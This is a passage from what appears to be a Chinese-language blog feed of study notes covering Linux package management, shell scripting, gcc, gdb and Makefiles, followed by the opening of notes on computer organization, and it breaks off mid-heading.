class="headerlink" title="3.6 nohup"></a>3.6 nohup</h4><blockquote><p>启动脱离终端运行的任务</p><p><a href="https://www.runoob.com/linux/linux-comm-nohup.html">nohup</a></p></blockquote><hr><h2 id="六、软件包管理"><a href="#六、软件包管理" class="headerlink" title="六、软件包管理"></a>六、软件包管理</h2><h3 id="1-备份"><a href="#1-备份" class="headerlink" title="1 备份"></a>1 备份</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 备份</span></span><br><span class="line">sudo <span class="built_in">mv</span> /etc/apt/sources.list /etc/apt/sources.list.bak</span><br><span class="line"><span class="comment"># 修改</span></span><br><span class="line">sudo vim /etc/apt/sources.list 或 sudo apt edit-sources</span><br><span class="line"><span class="comment"># 恢复</span></span><br><span class="line">sudo <span class="built_in">mv</span> /etc/apt/sources.list.bak /etc/apt/sources.list</span><br></pre></td></tr></table></figure><h3 id="2-指令"><a href="#2-指令" class="headerlink" title="2 指令"></a>2 指令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># apt -&gt; apt-get</span></span><br><span class="line"><span class="comment"># 安装软件包</span></span><br><span class="line">apt install</span><br><span class="line"><span class="comment"># 移除软件包</span></span><br><span class="line">apt remove</span><br><span class="line"><span class="comment"># 移除软件包和配置</span></span><br><span class="line">apt purge</span><br><span class="line"><span class="comment"># 更新可用软件包列表</span></span><br><span class="line">apt update</span><br><span class="line"><span class="comment"># 升级所有可升级的软件包</span></span><br><span class="line">apt upgrade</span><br><span class="line"><span class="comment"># 自动删除不需要的包</span></span><br><span class="line">apt autoremove</span><br><span class="line"><span class="comment"># 在升级软件包时自动处理依赖关系</span></span><br><span class="line">apt full-upgrade</span><br><span class="line"></span><br><span class="line"><span class="comment"># apt -&gt; apt-cache</span></span><br><span class="line"><span class="comment"># 搜索应用程序</span></span><br><span class="line">apt search</span><br><span class="line"><span class="comment"># 显示软件包细节</span></span><br><span class="line">apt show</span><br></pre></td></tr></table></figure><h3 id="3-无法定位软件包"><a href="#3-无法定位软件包" class="headerlink" title="3 无法定位软件包"></a>3 无法定位软件包</h3><blockquote><p><a href="https://www.cnblogs.com/Mishell/p/12535063.html">无法定位软件包</a></p><p><a href="https://blog.csdn.net/qq_49015005/article/details/117702582">无法定位软件包</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># root打开</span></span><br><span class="line">sudo mousepad /etc/apt/sources.list</span><br><span class="line"><span class="comment"># 更新apt</span></span><br><span class="line">sudo apt-get update</span><br><span class="line"><span class="comment"># 更新系统</span></span><br><span class="line">sudo apt-get upgrade</span><br><span class="line"><span class="comment"># 测试安装成功</span></span><br><span class="line">apt-cache search linux-headers</span><br><span class="line"></span><br><span class="line"><span class="comment"># 中科大镜像源</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><hr><h2 id="七、补充命令"><a href="#七、补充命令" class="headerlink" title="七、补充命令"></a>七、补充命令</h2><h3 id="1-系统操作"><a href="#1-系统操作" class="headerlink" title="1 系统操作"></a>1 系统操作</h3><h4 id="1-1-shutdown"><a href="#1-1-shutdown" class="headerlink" title="1.1 shutdown"></a>1.1 shutdown</h4><blockquote><p>立刻关机</p><p><a href="https://www.runoob.com/linux/linux-comm-shutdown.html">shutdown</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 立刻关机</span></span><br><span class="line">shutdown -h now</span><br></pre></td></tr></table></figure><h4 id="1-2-nautilus-目录名称"><a href="#1-2-nautilus-目录名称" class="headerlink" title="1.2 nautilus + 目录名称"></a>1.2 nautilus + 目录名称</h4><blockquote><p>打开目录</p><p><code>nautilus &lt;path&gt;</code></p></blockquote><h3 id="2-文件操作"><a href="#2-文件操作" class="headerlink" title="2 文件操作"></a>2 文件操作</h3><h4 id="2-1-umask"><a href="#2-1-umask" class="headerlink" title="2.1 umask"></a>2.1 umask</h4><blockquote><p>指定在建立文件时预设的权限掩码</p><p><a href="https://www.runoob.com/linux/linux-comm-umask.html">umask</a></p></blockquote><h4 id="2-2-wc"><a href="#2-2-wc" class="headerlink" title="2.2 wc"></a>2.2 wc</h4><blockquote><p>用于计算字数</p><p><a href="https://www.runoob.com/linux/linux-comm-wc.html">wc</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-c <span class="comment"># 显示字节</span></span><br><span class="line">-l <span class="comment"># 显示行</span></span><br><span class="line">-w <span class="comment"># 显示字</span></span><br></pre></td></tr></table></figure><h4 id="2-3-cat"><a href="#2-3-cat" class="headerlink" title="2.3 cat"></a>2.3 cat</h4><blockquote><p>concatenate，命令用于连接文件并打印到标准输出设备上</p><p><a href="https://www.runoob.com/linux/linux-comm-cat.html">cat</a></p></blockquote><h4 id="2-4-type"><a href="#2-4-type" class="headerlink" title="2.4 type"></a>2.4 type</h4><blockquote><p>判断文件类型</p><p><a href="https://www.iteye.com/blog/codingstandards-831504">type</a></p></blockquote><h4 id="2-5-grep"><a href="#2-5-grep" class="headerlink" title="2.5 grep"></a>2.5 grep</h4><blockquote><p>用于查找文件里符合条件的字符串</p><p><a href="https://www.runoob.com/linux/linux-comm-grep.html">grep</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用</span></span><br><span class="line"><span class="built_in">cat</span> &lt;file&gt; | grep <span class="string">&#x27;str&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串匹配查询</span></span><br><span class="line">grep -w <span class="string">&#x27;str&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="2-6-tail"><a href="#2-6-tail" class="headerlink" title="2.6 tail"></a>2.6 tail</h4><blockquote><p>用于查看文件的内容</p><p><a href="https://www.runoob.com/linux/linux-comm-tail.html">tail</a></p></blockquote><h4 id="2-7-find"><a href="#2-7-find" class="headerlink" title="2.7 find"></a>2.7 find</h4><blockquote><p>用来在指定目录下查找文件</p><p><a href="https://www.runoob.com/linux/linux-comm-find.html">find</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查找指定路径下的文件</span></span><br><span class="line">find path -name file</span><br></pre></td></tr></table></figure><h3 id="3-用户操作"><a href="#3-用户操作" class="headerlink" title="3 用户操作"></a>3 用户操作</h3><h4 id="3-1-id"><a href="#3-1-id" class="headerlink" title="3.1 id"></a>3.1 id</h4><blockquote><p>用于显示用户的ID，以及所属群组的ID</p><p><a href="https://www.runoob.com/linux/linux-comm-id.html">id</a></p></blockquote><h4 id="3-2-chmod"><a href="#3-2-chmod" class="headerlink" title="3.2 chmod"></a>3.2 chmod</h4><blockquote><p>控制用户对文件的权限的命令</p><p><a href="https://www.runoob.com/linux/linux-comm-chmod.html">chmod</a></p></blockquote><h3 id="4-网络操作"><a href="#4-网络操作" class="headerlink" title="4 网络操作"></a>4 网络操作</h3><h4 id="4-1-ip查看"><a href="#4-1-ip查看" class="headerlink" title="4.1 ip查看"></a>4.1 ip查看</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ip地址</span></span><br><span class="line">ifconfig</span><br><span class="line"><span class="comment"># 网关</span></span><br><span class="line">route -n</span><br></pre></td></tr></table></figure><h3 id="5-系统命令"><a href="#5-系统命令" class="headerlink" title="5 \ + 系统命令"></a>5 \ + 系统命令</h3><blockquote><p>会使用系统原本自带的命令而不是命令的别名。（不加会优先使用别名）</p></blockquote><hr><h2 id="八、Shell编程"><a href="#八、Shell编程" class="headerlink" title="八、Shell编程"></a>八、Shell编程</h2><blockquote><p><a href="http://c.biancheng.net/shell/">shell</a></p><p><a href="http://c.biancheng.net/shell/program/">shell</a></p><p><a href="https://blog.csdn.net/qq_50685659/article/details/125738428">shell的CSDN链接</a></p></blockquote><h3 id="1-头文件"><a href="#1-头文件" class="headerlink" title="1 头文件"></a>1 头文件</h3><blockquote><p>默认 #! /bin/bash</p><p>表示使用哪一种shell执行，可以修改。</p><p>创建脚本有 vi/vim gedit</p><p># 是注释</p></blockquote><h3 id="2-运行方式"><a href="#2-运行方式" class="headerlink" title="2 运行方式"></a>2 运行方式</h3><div class="table-container"><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>chmod +x  name.sh</td><td>为脚本添加可执行权限，然后直接运行。该方法运行可以是绝对路径可以是相对路径（相对路径： ./ ）</td></tr><tr><td>bash name.sh</td><td>或者sh name.sh，运行脚本</td></tr><tr><td>source name.sh</td><td>或者. name.sh：直接运行，但是在terminal下值是静态的</td></tr></tbody></table></div><h3 id="3-变量"><a href="#3-变量" class="headerlink" title="3 变量"></a>3 变量</h3><blockquote><p><a href="https://www.runoob.com/linux/linux-comm-set.html">set</a>：设置</p><p><a href="https://www.runoob.com/linux/linux-comm-set.html">unset</a>：删除</p><p><a href="https://www.runoob.com/linux/linux-comm-expr.html">expr</a>：表达式计算：<code>expr $a + $b</code></p><p><a href="https://www.runoob.com/linux/linux-comm-let.html">let</a>：直接计算：<code>let x+=1</code></p></blockquote><p><img src="/posts/57602ae6/shell变量的替换.jpg" alt="img"><img src="/posts/57602ae6/关联数组.jpg" alt="img"><img src="/posts/57602ae6/访问数组.jpg" alt="img"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 变量定义</span></span><br><span class="line">var=value <span class="comment">#（两边不能加空格）（变量中无特殊字符可以不加引号）</span></span><br><span class="line"><span class="string">&#x27; &#x27;</span> <span class="comment"># 原样输出。</span></span><br><span class="line"><span class="string">&quot; &quot;</span> <span class="comment"># 解析内容后输出。</span></span><br><span class="line">` ` <span class="comment"># 命令替换 （相比 $&#123; &#125; 移植性好）</span></span><br><span class="line"><span class="comment"># 变量访问</span></span><br><span class="line"><span class="variable">$&#123;name&#125;</span>  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数组，元素间用空格隔开</span></span><br><span class="line">array_name=(value1 value2 value3 ... )</span><br><span class="line"><span class="comment"># 下标访问</span></span><br><span class="line"><span class="variable">$&#123;arrary_name[0]&#125;</span>（一定要带上大括号，不然会寻找会出错）</span><br><span class="line"><span class="comment"># 获取全部元素</span></span><br><span class="line"><span class="variable">$&#123;arrary_name[@ or *]&#125;</span></span><br><span class="line"><span class="comment"># 获取数组长度</span></span><br><span class="line"><span class="variable">$&#123;#arrary_name[@ or *]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 环境变量</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="comment"># 特殊变量</span></span><br><span class="line">$$ <span class="comment"># Shell本身的PID（ProcessID）</span></span><br><span class="line">$! <span class="comment"># Shell最后运行的后台Process的PID</span></span><br><span class="line">$? <span class="comment"># 最后运行的命令的结束代码（返回值）</span></span><br><span class="line">$- <span class="comment"># 使用Set命令设定的Flag一览</span></span><br><span class="line">$* <span class="comment"># 所有参数列表，以&quot;$1$2...$n&quot;形式输出所有参数</span></span><br><span class="line"><span class="variable">$@</span> <span class="comment"># 输出所有参数，每个参数作为一个单独的字符串</span></span><br><span class="line"><span class="variable">$#</span> <span class="comment"># 添加到Shell的参数个数</span></span><br><span class="line"><span class="variable">$0</span> <span class="comment"># Shell本身的文件名</span></span><br><span class="line"><span class="variable">$1</span>~<span class="variable">$n</span> <span class="comment"># 添加到Shell的各参数值：$1第一个参数，$n第n个参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 算术表达式（无空格）</span></span><br><span class="line">$[100/2]</span><br><span class="line"><span class="comment"># 逻辑表达式（左右有空格，数字与符号间有空格）</span></span><br><span class="line"><span class="built_in">test</span> 2 = 5</span><br><span class="line">[ 2 = 5 ]</span><br><span class="line"><span class="comment">#结果用$?可获得，0为真1为假。</span></span><br></pre></td></tr></table></figure><h3 id="4-交互"><a href="#4-交互" class="headerlink" title="4 交互"></a>4 交互</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 标准化输出</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; &quot;</span> </span><br><span class="line">-e <span class="comment"># 识别转义字符</span></span><br><span class="line">-n <span class="comment"># 忽略换行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 格式化输出（变量置后，带取值符号,同C）</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot; &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入</span></span><br><span class="line"><span class="built_in">read</span> <span class="string">&quot;&quot;</span></span><br><span class="line">-p <span class="comment"># 提示语句 后面跟变量（变量不带取值符号）</span></span><br></pre></td></tr></table></figure><h3 id="5-条件判断"><a href="#5-条件判断" class="headerlink" title="5 条件判断"></a>5 条件判断</h3><blockquote><p><a href="https://blog.csdn.net/lyndon_li/article/details/120735191">真与假</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="keyword">elif</span> condition</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">[ <span class="keyword">else</span> ]</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment"># condition：条件，带上 (( )) 或 [[ ]]（要空格隔开） （这中间再写 的 [] 之间不要用空格隔开 ）</span></span><br><span class="line"><span class="comment"># 写在同一行则每个语句后要带分号（分号前后紧跟）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> condition <span class="keyword">in</span></span><br><span class="line">num)</span><br><span class="line">statement</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">statement</span><br><span class="line">;;</span><br><span class="line"><span class="comment"># condition：不要带括号</span></span><br><span class="line"><span class="comment"># ;;：break</span></span><br><span class="line"><span class="comment"># *)：default</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断是否是字符设备</span></span><br><span class="line"><span class="keyword">if</span> [ -c <span class="string">&quot;<span class="variable">$filename</span>&quot;</span> ]</span><br></pre></td></tr></table></figure><h3 id="6-循环"><a href="#6-循环" class="headerlink" title="6 循环"></a>6 循环</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># C语言</span></span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">0</span>;i&lt;x;i+=<span class="number">1</span>))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">statement</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h3 id="7-函数"><a href="#7-函数" class="headerlink" title="7 函数"></a>7 函数</h3><blockquote><p>return 返回值：一般不用return返回函数中的值（容易出错）。一般用<code>$?</code></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">func_name</span></span> () &#123;&#125;</span><br><span class="line"><span class="function"><span class="title">func_name</span></span> () &#123;&#125;</span><br><span class="line"><span class="keyword">function</span> func_name &#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="8-运算符"><a href="#8-运算符" class="headerlink" title="8 运算符"></a>8 运算符</h3><blockquote><p>对于括号外的逻辑运算符是： <code>&amp;&amp;</code>和 <code>||</code> </p></blockquote><div class="table-container"><table><thead><tr><th>数值比较运算符</th><th>作用</th></tr></thead><tbody><tr><td>-eq -ne</td><td>等于，不等于</td></tr><tr><td>-gt -ge （Greater than it）</td><td>大于，大于等于</td></tr><tr><td>-lt -le（less than it）</td><td>小于，小于等于</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>逻辑运算符</th><th>作用</th></tr></thead><tbody><tr><td>!</td><td>非</td></tr><tr><td>-o</td><td>或</td></tr><tr><td>-a</td><td>与</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>字符串检测运算符</th><th>作用</th></tr></thead><tbody><tr><td>=</td><td>等于</td></tr><tr><td>!=</td><td>不等于</td></tr><tr><td>-z</td><td>长度为0</td></tr><tr><td>-n</td><td>长度不为0</td></tr><tr><td>$</td><td>为空</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>文件测试运算符</th><th>作用</th></tr></thead><tbody><tr><td>-b</td><td>检测文件是否是块设备文件</td></tr><tr><td>-c</td><td>检测文件是否是字符设备文件</td></tr><tr><td>-d</td><td>检测文件是否是目录文件</td></tr><tr><td>-f</td><td>检测文件是否是普通文件（既不是目录也不是设备文件）</td></tr><tr><td>-g</td><td>检测文件是否设置了SGID位</td></tr><tr><td>-k</td><td>检测文件是否设置了粘着位（stucky Bit）</td></tr><tr><td>-p</td><td>检测文件是否具名管道</td></tr><tr><td>-u</td><td>检测文件是否设置了SUID位</td></tr><tr><td>-r</td><td>检测文件是否可读</td></tr><tr><td>-w</td><td>检测文件是否可写</td></tr><tr><td>-x</td><td>检测文件是否可执行</td></tr><tr><td>-s</td><td>检测文件是否为不为空（文件大小是否不为0）</td></tr><tr><td>-e</td><td>检测文件(包括目录)是否存在</td></tr><tr><td>-a</td><td>检测文件(包括目录)是否存在</td></tr><tr><td>-S</td><td>检测文件是否是套接字</td></tr><tr><td>-L</td><td>检测文件是否存在并且是一个符号链接</td></tr></tbody></table></div><hr><h2 id="九、GCC"><a href="#九、GCC" class="headerlink" title="九、GCC"></a>九、GCC</h2><h3 id="1-vi-vim编辑"><a href="#1-vi-vim编辑" class="headerlink" title="1 vi/vim编辑"></a>1 vi/vim编辑</h3><blockquote><p><a href="https://www.runoob.com/linux/linux-vim.html">vi/vim</a></p></blockquote><div class="table-container"><table><thead><tr><th>命令模式命令</th><th>作用</th></tr></thead><tbody><tr><td>:w</td><td>保存</td></tr><tr><td>:q</td><td>退出</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>编辑模式命令</th><th>作用</th></tr></thead><tbody><tr><td>i</td><td>进入编辑</td></tr><tr><td>esc</td><td>退出编辑</td></tr></tbody></table></div><h3 id="2-安装gcc"><a href="#2-安装gcc" class="headerlink" title="2 安装gcc"></a>2 安装gcc</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看依赖关系</span></span><br><span class="line">apt-cache depends build-essential</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装gcc</span></span><br><span class="line">sudo apt install build-essential</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看版本</span></span><br><span class="line">gcc -v</span><br></pre></td></tr></table></figure><h3 id="3-GCC编译"><a href="#3-GCC编译" class="headerlink" title="3 GCC编译"></a>3 GCC编译</h3><blockquote><p>编译会重编译源文件，所以对于复杂项目来说未改动的源文件不需要再编译</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编译流程</span></span><br><span class="line"><span class="comment"># 1. 预处理（简化代码，调用 cpp 生成 .i 文件）</span></span><br><span class="line">gcc -E</span><br><span class="line"><span class="comment"># 2. 编译（C到汇编，调用 ccl 生成 .s 文件）</span></span><br><span class="line">gcc -S</span><br><span class="line"><span class="comment"># 3. 汇编（汇编到机器，调用 as 生成 .o 文件）</span></span><br><span class="line">gcc -c</span><br><span class="line"><span class="comment"># 4. 链接（链接机器码，调用 ld 生成文件）</span></span><br><span class="line">gcc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接输出</span></span><br><span class="line">gcc</span><br><span class="line"><span class="comment"># 指定输出文件</span></span><br><span class="line">-o zp</span><br><span class="line"><span class="comment"># 输出编译警告</span></span><br><span class="line">gcc -Wall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 复杂项目（分别编译源文件再对编译后文件进行链接）</span></span><br><span class="line">gcc -c hello.c</span><br><span class="line">gcc -c helloMain.c</span><br><span class="line">gcc -o hello hello.c helloMain.c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单项目（多个文件一起编译）</span></span><br><span class="line">gcc hello.c helloMain.c hello.h -o hello</span><br></pre></td></tr></table></figure><h3 id="4-gdb调试"><a href="#4-gdb调试" class="headerlink" title="4 gdb调试"></a>4 gdb调试</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/357360607">gdb调试</a></p><p><code>gcc -g main.c</code>编译出的文件才可以被调试</p></blockquote><div class="table-container"><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>l ( list )</td><td>显示代码；list 行号——显示当前文件以“行号”为中心的前后10行代码；list 函数名——显示“函数名”所在函数的源代码。</td></tr><tr><td>b n( break )</td><td>设置端点，参数为行数或函数名；也可用“文件名：行数”或“文件名：函数名”</td></tr><tr><td>tb n( tbreak )</td><td>临时端点，参数同b</td></tr><tr><td>info b [ n ] ( i b/info break )</td><td>查看断点</td></tr><tr><td>info program</td><td>查看程序是否正在运行，程序进程号，被暂停的原因</td></tr><tr><td>clear n</td><td>清除第n行断点</td></tr><tr><td>d n ( delete )</td><td>删除第n个断点</td></tr><tr><td>disable n</td><td>暂停第n个断点</td></tr><tr><td>enable n</td><td>开启第n个断点</td></tr><tr><td>r ( run )</td><td>执行程序</td></tr><tr><td>s ( step )</td><td>有函数进入函数，无则单步执行</td></tr><tr><td>n ( next )</td><td>单步执行，不进入函数</td></tr><tr><td>c ( continue )</td><td>继续执行程序</td></tr><tr><td>p n( print )</td><td>打印表达式；表达式：变量，操作或函数调用</td></tr><tr><td>until</td><td>可以运行程序直到退出循环体</td></tr><tr><td>finish</td><td>运行程序（直到当前函数完成返回），并打印函数返回时的堆栈地址和返回值及参数等信息</td></tr><tr><td>watch n</td><td>设置监视点，一旦被监视的“表达式”的值改变，gdb将强行终止正在被调试的程序</td></tr><tr><td>frame n</td><td>移动到指定的帧栈，并打印栈的信息；n为帧编号，不指定n则打印当前栈的信息</td></tr><tr><td>set args n</td><td>指定运行时的参数</td></tr><tr><td>show args</td><td>查看设置好的参数</td></tr><tr><td>show paths</td><td>查看程序运行路径；set environment varname [ = value]设置环境变量；用show environment [ varname ]查看环境变量</td></tr><tr><td>cd / pwd</td><td>切换/显示路径</td></tr><tr><td>shell xxx</td><td>执行shell命令行，xxx为shell命令</td></tr><tr><td>bt ( backtrace)</td><td>查看堆栈；最下面是先执行的函数</td></tr><tr><td>threads</td><td>查看所有线程</td></tr><tr><td>thread n</td><td>切换线程，参数为线程号；线程号用threads查看（流程：threads——thread n——bt）</td></tr><tr><td>condition</td><td>给断点设置触发条件，如（b 10 if a &gt; b ( condition 1 if a &gt; b ) 等价 ( 假设b 10的断点号为1) ）；取消用condition 断点号</td></tr><tr><td>ignore</td><td>特殊断点条件，程序只有到达该断点指定次数后才会触发。如ignore 1 10（断点号1的断点过10次后触发）</td></tr><tr><td>kill</td><td>强行终止当前在调试的程序</td></tr><tr><td>help</td><td>帮助</td></tr><tr><td>call 函数（参数）</td><td>调用函数</td></tr><tr><td>layout</td><td>用于分割窗口。</td></tr><tr><td>layout src</td><td>显示源代码窗口</td></tr><tr><td>layout asm</td><td>显示反汇编窗口</td></tr><tr><td>layout regs</td><td>显示源代码/反汇编和CPU寄存器窗口</td></tr><tr><td>layout split</td><td>显示源代码和反汇编窗口</td></tr><tr><td>display</td><td>每次单步执行后输出被设置的表达式及值</td></tr><tr><td>stepi / nexti</td><td>单步跟踪一些机器指令</td></tr><tr><td>Ctrl + L</td><td>刷新窗口</td></tr><tr><td>q ( quit )</td><td>退出gdb</td></tr></tbody></table></div><h3 id="5-make-和-Makefile"><a href="#5-make-和-Makefile" class="headerlink" title="5 make 和 Makefile"></a>5 make 和 Makefile</h3><ol><li><p>生成Makefile文件</p></li><li><p>输入<br>`target… : prerequisties …</p><pre><code>         command         ...`</code></pre><blockquote><p>command前必须是tab而不是空格。</p><p>如果prerequisties中有一个以上的文件比target文件要新，command中定义的东西就会被执行。</p><p># 为注释，# 为输出井号。\可以换行，后面不可以接空格</p></blockquote><ul><li><p>例子</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objects = main.o command.o</span><br><span class="line">edit:$(objects)</span><br><span class="line">        cc -o edit $(objects)</span><br><span class="line">$(objects):defs.h</span><br><span class="line">main.o:command.h</span><br><span class="line">command.o:buffer.h</span><br><span class="line">clean:</span><br><span class="line">        <span class="built_in">rm</span> edit $(objects)</span><br></pre></td></tr></table></figure></li></ul></li><li><p>执行</p><ul><li>make编译Makefile</li><li>执行clean：make clean</li></ul></li></ol><h3 id="6-Autotools-和-make-使用"><a href="#6-Autotools-和-make-使用" class="headerlink" title="6 Autotools 和 make 使用"></a>6 Autotools 和 make 使用</h3><blockquote><p><a href="http://www.cppblog.com/noflybird/archive/2010/01/20/82973.html">autotools&amp;make</a></p></blockquote><h2 id="十、Linux高级应用"><a href="#十、Linux高级应用" class="headerlink" title="十、Linux高级应用"></a>十、Linux高级应用</h2><ul><li><p><a href=".\c5fc2764">text::Kali Linux</a> </p></li><li><p>人工智能</p></li><li><p>区块链</p></li><li><p>大数据</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 操作系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 计算机系统 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理</title>
      <link href="/posts/8d4b7ae1.html"/>
      <url>/posts/8d4b7ae1.html</url>
      
        <content type="html"><![CDATA[<h1 id="计算机组成原理"><a href="#计算机组成原理" class="headerlink" title="计算机组成原理"></a>计算机组成原理</h1><hr><h2 id="一、计算机系统概述"><a href="#一、计算机系统概述" class="headerlink" title="一、计算机系统概述"></a>一、计算机系统概述</h2><h3 id="1-发展历程"><a href="#1-发展历程" class="headerlink" title="1 发展历程"></a>1 发展历程</h3><blockquote><p>（以微处理机为标志）电子管——晶体管——中小规模集成电路——超大规模集成电路。</p><p>摩尔定律：集成电路上可容纳的晶体管的数目，约每隔 18 个月便会增加一倍，性能也将提升一倍。</p></blockquote><h3 id="2-层次结构"><a href="#2-层次结构" class="headerlink" title="2 层次结构"></a>2 层次结构</h3><ul><li><p>基础</p><blockquote><p>硬件系统和软件系统共同构成了一个完整的计算机系统。</p><p>软硬件逻辑等价：软硬件都可以实现。<br>一般硬件直接实现效果要优。</p></blockquote></li><li><p>冯诺依曼机器</p><ol><li>存储程序工作方式。</li><li>运算器、存储器、控制器、输入设备、输出设备。</li><li>指令和数据通等地位放在存储器中，均为二进制码表示。</li></ol><ul><li><p>存储程序</p><blockquote><p>存储程序原理就是将我们为解决特定问题而编写的程序存放在<a href="https://baike.baidu.com/item/计算机存储器/786229?fromModule=lemma_inlink">计算机存储器</a>中，然后按存储器存储程序的首地址执行程序的第一条指令。以后就按照该程序的规定顺序执行其他指令，直至程序结束执行。</p></blockquote></li><li><p>存储器</p><blockquote><p>地址存储器（MAR）、数据存储器（MDR）。</p></blockquote></li><li><p>运算器</p><blockquote><p>核心是算术逻辑单元（ALU）。</p></blockquote></li><li><p>控制器</p><blockquote><p>程序计数器（PC）、指令寄存器（IR）和控制单元（CU）。</p></blockquote></li></ul></li><li><p>计算机软件</p><ul><li>系统软件：一组保证计算机系统高效、正确运行的基础软件。（OS，DBMS等）</li><li>应用软件：用户为解决某个应用领域中的各类问题而编制的程序。</li><li>机器语言、汇编语言、高级语言。</li></ul></li><li><p>层次结构</p><ol><li>微程序机器层</li><li>传统机器层</li><li>操作系统层（操作系统是由机器指令和广义指令组成，又叫混合层）</li><li>汇编语言层</li><li>高级语言层</li></ol><blockquote><p>层次之间关系紧密，下层是上层的基础，上层是下层的扩展。</p><p>没有配备软件的纯硬件系统成为裸机。</p><p>软件和硬件之间的界面就是指令集体系结构（ISA）。</p></blockquote></li><li><p>工作原理</p><ul><li>存储程序工作：——&gt;PC取指——&gt;指令译码，PC+=1——&gt;取数执行——&gt;送结果——</li><li>编译：预处理——&gt;编译——&gt;汇编——&gt;链接</li></ul></li></ul><h3 id="3-性能指标"><a href="#3-性能指标" class="headerlink" title="3 性能指标"></a>3 性能指标</h3><hr><h2 id="二、数据表示和运算"><a href="#二、数据表示和运算" class="headerlink" title="二、数据表示和运算"></a>二、数据表示和运算</h2><h3 id="1-进制与编码"><a href="#1-进制与编码" class="headerlink" title="1 进制与编码"></a>1 进制与编码</h3><h4 id="gt-十六进制负数判断技巧"><a href="#gt-十六进制负数判断技巧" class="headerlink" title="=&gt;十六进制负数判断技巧"></a>=&gt;十六进制负数判断技巧</h4><blockquote><p>因为最高位为符号位，所以用二进制看1后面跟n个零即为负数的起始位置，而0后面跟n个1为整数的结束位置，也就是可以表示的最大正数。以0xFF两位十六进制数为例，由上面结论可知：0-0x7F为正数，0x80-0xFF为负数，依次类推。</p></blockquote><h3 id="2-运算方法和运算电路"><a href="#2-运算方法和运算电路" class="headerlink" title="2 运算方法和运算电路"></a>2 运算方法和运算电路</h3><h3 id="3-浮点数表示和运算"><a href="#3-浮点数表示和运算" class="headerlink" title="3 浮点数表示和运算"></a>3 浮点数表示和运算</h3><hr><h2 id="三、存储系统"><a href="#三、存储系统" class="headerlink" title="三、存储系统"></a>三、存储系统</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1 概述"></a>1 概述</h3><h3 id="2-主存"><a href="#2-主存" class="headerlink" title="2 主存"></a>2 主存</h3><h3 id="3-主存与CPU的连接"><a href="#3-主存与CPU的连接" class="headerlink" title="3 主存与CPU的连接"></a>3 主存与CPU的连接</h3><h3 id="4-外存"><a href="#4-外存" class="headerlink" title="4 外存"></a>4 外存</h3><h3 id="5-Cache"><a href="#5-Cache" class="headerlink" title="5 Cache"></a>5 Cache</h3><h3 id="6-虚存"><a href="#6-虚存" class="headerlink" title="6 虚存"></a>6 虚存</h3><hr><h2 id="四、指令系统"><a href="#四、指令系统" class="headerlink" title="四、指令系统"></a>四、指令系统</h2><h3 